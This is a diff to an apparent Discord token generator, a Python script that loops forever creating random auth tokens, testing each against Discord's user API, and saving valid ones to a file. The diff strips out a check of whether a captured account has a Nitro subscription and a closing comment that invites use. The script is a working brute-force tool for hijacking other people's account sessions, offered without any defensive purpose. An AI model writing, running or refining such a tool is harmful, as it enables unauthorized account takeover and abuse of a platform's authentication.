@@ -24,27 +24,11 @@ def validate_token(token):
     try:
         response = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
         if response.status_code == 200:
-            return True, check_nitro(token)
+            return True
         else:
-            return False, False
+            return False
     except requests.exceptions.RequestException as e:
         print(f"Error validating token: {e}")
-        return False, False
-
-# Function to check Nitro status
-def check_nitro(token):
-    headers = {
-        "Authorization": token,
-        "Content-Type": "application/json"
-    }
-    try:
-        response = requests.get("https://discord.com/api/v9/users/@me/billing/subscriptions", headers=headers)
-        if response.status_code == 200 and len(response.json()) > 0:
-            return True  # User has Nitro
-        else:
-            return False  # User doesn't have Nitro
-    except requests.exceptions.RequestException as e:
-        print(f"Error checking Nitro status: {e}")
         return False
 
 # Function to save valid tokens
@@ -79,11 +63,11 @@ ________________________________________________________________________________
     with open('tokens.txt', 'w') as token_file:
         while True:
             token = generate_token()
-            valid, nitro = validate_token(token)
+            valid = validate_token(token)
             token_display = token[:30] + "***"  # Mask part of the token in the terminal
 
             if valid:
-                print(f"\033[92m[+] Valid\033[0m > \033[97m{token_display}\033[0m | {'has Nitro' if nitro else 'doesn\'t have Nitro'}")
+                print(f"\033[92m[+] Valid\033[0m > \033[97m{token_display}\033[0m")
                 save_valid_token(token)
             else:
                 print(f"\033[91m[-] Invalid\033[0m > \033[97m{token_display}\033[0m")
@@ -93,5 +77,3 @@ ________________________________________________________________________________
 
 if __name__ == "__main__":
     main()
-
-# enjoy the token which have low chance to gen vaild token gen :skull:
